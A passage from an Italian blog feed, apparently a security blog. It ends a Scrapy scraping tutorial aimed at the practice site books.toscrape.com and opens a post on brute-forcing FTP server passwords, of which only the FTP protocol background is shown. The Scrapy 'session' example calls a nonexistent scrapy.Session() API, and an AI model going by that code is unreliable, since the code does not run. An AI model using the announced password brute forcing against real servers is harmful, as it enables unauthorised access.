&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo modo, il spider inizia visitando la pagina di login, estrae il token CSRF e invia una richiesta di form con i dati di login e il token. Quindi, utilizza la funzione after_login come callback per gestire la risposta della richiesta di form. In questa funzione, il spider controlla se l&amp;rsquo;autenticazione è stata eseguita con successo e, in caso contrario, registra un errore. In caso contrario, il spider inizia a fare scraping dei dati e a seguire i link per le pagine successive.&lt;/p&gt;
&lt;h2 id=&#34;scraping-di-dati-da-una-pagina-ajax&#34;&gt;Scraping di dati da una pagina AJAX&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AJAXBookSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ajaxbookspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/ajax&amp;#34;&lt;/span&gt;]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#75715e&#34;&gt;# Invia una richiesta POST per ottenere i dati dei libri tramite AJAX&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FormRequest(
            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/ajax&amp;#34;&lt;/span&gt;,
            formdata&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;page&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;},
            callback&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse_ajax_response
        )

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse_ajax_response&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#75715e&#34;&gt;# Estraiamo i dati dei libri dalla risposta AJAX&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 a::attr(title)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo esempio, lo spider utilizza il metodo scrapy.FormRequest() per inviare una richiesta POST con i dati del form AJAX alla pagina web. La risposta AJAX contiene i dati dei libri che vengono estratti dalla pagina utilizzando il metodo parse_ajax_response().&lt;/p&gt;
&lt;h2 id=&#34;scraping-di-dati-da-una-pagina-utilizzando-una-sessione&#34;&gt;Scraping di dati da una pagina utilizzando una sessione&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SessionBookSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sessionbookspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start_requests&lt;/span&gt;(self):
        &lt;span style=&#34;color:#75715e&#34;&gt;# Iniziamo una sessione&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;session &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Session()
        &lt;span style=&#34;color:#75715e&#34;&gt;# Effettuiamo il login&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/login&amp;#34;&lt;/span&gt;, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pass&amp;#34;&lt;/span&gt;})]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 a::attr(title)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo esempio, lo spider utilizza una sessione per effettuare il login alla pagina web prima di iniziare a estrarre i dati. Utilizzando il metodo start_requests() per effettuare il login e il metodo parse() per estrarre i dati, lo spider mantiene la sessione attiva durante tutto il processo di scraping.&lt;/p&gt;
&lt;h2 id=&#34;scraping-di-tutti-i-prezzi-dei-libri-su-tutte-le-pagine&#34;&gt;Scraping di tutti i prezzi dei libri su tutte le pagine&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AllPricesSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;allpricesspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
            }
        next_page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;li.next &amp;gt; a::attr(href)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; next_page &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;follow(next_page, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice è un esempio di uno spider Scrapy che estrae i prezzi di tutti i libri presenti sul sito &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt; e li salva in un formato predefinito.&lt;/p&gt;
&lt;p&gt;Il codice importa la libreria di scrapy, quindi definisce una classe &lt;em&gt;AllPricesSpider&lt;/em&gt; che estende la classe base &lt;em&gt;scrapy.Spider&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La classe ha un nome univoco &lt;strong&gt;name&lt;/strong&gt; e una lista di URL da cui iniziare a raccogliere i dati &lt;strong&gt;start_urls&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Il metodo &lt;em&gt;parse&lt;/em&gt; è chiamato per ogni pagina visitata e utilizza la funzione &lt;em&gt;response.css&lt;/em&gt; per selezionare tutti gli elementi &lt;strong&gt;article.product_pod&lt;/strong&gt; sulla pagina. Per ogni elemento selezionato, estrae il prezzo utilizzando la selezione &lt;em&gt;.price_color::text&lt;/em&gt; e lo salva in un dizionario.&lt;/p&gt;
&lt;p&gt;Infine, il codice cerca il link per la pagina successiva, se esiste, utilizzando la funzione &amp;ldquo;response.css(&amp;ldquo;li.next &amp;gt; a::attr(href)&amp;quot;).get()&amp;rdquo; e segue il link utilizzando la funzione &amp;ldquo;response.follow(next_page, self.parse)&amp;rdquo; per continuare a raccogliere dati dalle successive pagine.&lt;/p&gt;
&lt;h2 id=&#34;scraping-di-tutti-i-titoli-e-le-categorie-dei-libri&#34;&gt;Scraping di tutti i titoli e le categorie dei libri&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TitleCategorySpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;titlecategoryspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;category&amp;#34;&lt;/span&gt;: response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nav &amp;gt; ul &amp;gt; li.active &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice utilizza la libreria scrapy per estrarre dati da una pagina web. In particolare, il codice crea una classe chiamata &lt;em&gt;TitleCategorySpider&lt;/em&gt; che estrae i titoli dei libri e la categoria dei libri dalla pagina web &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;La classe &lt;strong&gt;TitleCategorySpider&lt;/strong&gt; estende la classe &lt;em&gt;scrapy.Spider&lt;/em&gt; e definisce un metodo &lt;em&gt;parse&lt;/em&gt; che viene chiamato quando la pagina specificata in &lt;em&gt;start_urls&lt;/em&gt; è scaricata.&lt;/p&gt;
&lt;p&gt;Il metodo &lt;em&gt;parse&lt;/em&gt; utilizza il metodo &lt;em&gt;response.css&lt;/em&gt; per selezionare gli elementi delle pagine web. Utilizza il metodo &lt;strong&gt;css&lt;/strong&gt; per selezionare gli elementi &lt;em&gt;article.product_pod&lt;/em&gt; dalla pagina web. Per ogni elemento selezionato, utilizza il metodo &lt;strong&gt;css&lt;/strong&gt; di nuovo per estrarre il titolo del libro (&amp;ldquo;h3 &amp;gt; a::text&amp;rdquo;) e la categoria del libro (&amp;ldquo;nav &amp;gt; ul &amp;gt; li.active &amp;gt; a::text&amp;rdquo;) e quindi li salva in un dizionario.&lt;/p&gt;
&lt;p&gt;Il metodo &lt;em&gt;yield&lt;/em&gt; è utilizzato per restituire il dizionario come risultato del metodo parse. In questo modo, scrapy sa che il risultato deve essere raccolto e utilizzato per qualcos&amp;rsquo;altro, come la scrittura su un file o la memorizzazione in un database.&lt;/p&gt;
&lt;h2 id=&#34;scraping-delle-immagini-dei-libri&#34;&gt;Scraping delle immagini dei libri&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BookImageSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bookimagespider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;image_urls&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;img::attr(src)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getall(),
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il codice utilizza la libreria scrapy per creare uno spider chiamato &lt;em&gt;bookimagespider&lt;/em&gt; che inizia a navigare dalla pagina &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Il metodo parse(self, response) viene chiamato per ogni pagina visitata dallo spider. Il metodo cerca tutti gli elementi HTML con classe &lt;em&gt;product_pod&lt;/em&gt; che rappresentano i libri nella pagina. Per ogni elemento trovato, estrae il titolo del libro e l&amp;rsquo;URL dell&amp;rsquo;immagine del libro.&lt;/p&gt;
&lt;p&gt;L&amp;rsquo;URL dell&amp;rsquo;immagine del libro viene estratto tramite il metodo .css(&amp;ldquo;img::attr(src)&amp;quot;).getall() che seleziona tutti gli elementi img e estrae l&amp;rsquo;attributo src. Il risultato è una lista di URL delle immagini dei libri.&lt;/p&gt;
&lt;p&gt;Questi dati estratti vengono quindi restituiti come un dizionario con le chiavi &lt;em&gt;title&lt;/em&gt; e &lt;em&gt;image_urls&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&#34;scraping-dei-prezzi-dei-libri-in-un-formato-specifico-es-json&#34;&gt;Scraping dei prezzi dei libri in un formato specifico (es. JSON)&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PriceSpiderJSON&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pricespiderjson&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    custom_settings &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FEED_FORMAT&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;json&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FEED_URI&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;prices.json&amp;#34;&lt;/span&gt;,
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice utilizza la libreria scrapy per creare uno spider chiamato &lt;em&gt;PriceSpiderJSON&lt;/em&gt;, che inizia a navigare nella pagina web &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt; e recupera i prezzi dei libri presenti su quella pagina. Utilizza il metodo parse() per elaborare la risposta ottenuta dalla pagina web e recuperare i prezzi. Il metodo yield {} serve per generare un dizionario di output contenente la proprietà &amp;ldquo;price&amp;rdquo; con il prezzo del libro.&lt;/p&gt;
&lt;p&gt;Il dizionario custom_settings definisce il formato del feed e il nome del file in cui verranno salvati i dati recuperati dallo spider. In questo caso il feed verrà salvato in formato JSON con nome &lt;strong&gt;prices.json&lt;/strong&gt;.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Brute Force di un Server FTP</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/</guid>
      <description>Table Of Contents:
 Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.
Basi sul Protocollo FTP Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file.</description>
      <content>&lt;p&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#basi-sul-protocollo-ftp&#34;&gt;Basi sul Protocollo FTP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#configurazione-di-un-server-ftp-con-vsftpd&#34;&gt;Configurazione di un Server FTP con Vsftpd&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#brute-forcing-delle-credenziali-di-un-server-ftp-con-python&#34;&gt;Brute Forcing delle credenziali di un server FTP con Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#prova-sul-campo&#34;&gt;Prova sul Campo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.&lt;/p&gt;
&lt;h1 id=&#34;basi-sul-protocollo-ftp&#34;&gt;Basi sul Protocollo FTP&lt;/h1&gt;
&lt;p&gt;Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file. É uno dei protocolli più vecchi di Internet. Già a partire dal 1974 si inizia a lavorare con la tecnologia di trasmissione dei file completi. Nel 1985 si definisce con esattezza il FTP nel documento Request For Comments 959. Il protocollo ftp è un protocollo indipendente quindi è possibile usarlo su qualsiasi computer, indipendentemente dal sistema operativo che vi si usa. Questo servizio viene usato anche nella posta odierna, questo perché, anche essendo un protocollo datato permette il trasferimento di file di notevoli dimensioni. C’è una distinzione da fare tra ftp pubblico e ftp privato:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ftp pubblico&lt;/strong&gt;: viene definito tale quando un client esegue il download su un sito web, o su un qualsiasi sito che permette di scaricare file durante la navigazione in questo caso può essere chiamato anche anonymous ftp.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ftp privato&lt;/strong&gt;: se ad esempio un provider mette a disposizione uno spazio web, directory comprese per fare il download e upload dei file html esso viene definito ftp privato o full service ftp.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il File Transfer Protocol viene eseguito all’interno del livello applicativo dello stack TCP/IP, ossia nello stesso livello di HTTP o POP. Questi protocolli si caratterizzano per il loro funzionamento in combinazione con i programmi, come browser o client di posta elettronica, grazie ai quali svolgono la propria funzione. Anche per il File Transfer Protocol esistono dei software FTP dedicati.
Per stabilire una connessione FTP vengono aperti due canali. Per prima cosa client e server creano un canale di controllo tramite la porta 21, tramite il quale il client invia comandi al server e questo risponde con i codici di stato. Dopodiché entrambi possono creare un canale dati che trasporta i file desiderati da una parte all’altra. Il protocollo controlla eventuali errori.&lt;/p&gt;
